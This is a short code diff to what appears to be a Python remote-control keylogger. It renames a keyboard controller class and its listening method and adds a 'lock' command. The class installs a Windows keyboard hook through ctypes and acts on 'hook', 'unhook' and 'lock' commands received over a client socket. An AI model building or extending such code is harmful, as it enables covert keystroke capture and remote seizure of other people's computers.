@@ -3,7 +3,7 @@ from ctypes.wintypes import DWORD, MSG
 import KeyLog
 import threading
 
-class keyboardController():
+class KeyboardController():
     def __init__(self, clientSocket):
         self.__client = clientSocket
         self.HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))
@@ -19,13 +19,14 @@ class keyboardController():
                 self.keyhook.unistallHookProc()
                 return
         
-
-    def keyStroke(self):
+    def startListening(self):
         request = ""
         while True:
             request = self.__client.recv(1024).decode("utf-8")
             if not request:
                 break
+            if request == "lock":
+                self.lockKeyboard()
             if request == "hook":
                 self.hookKey()
             elif request == "unhook":   
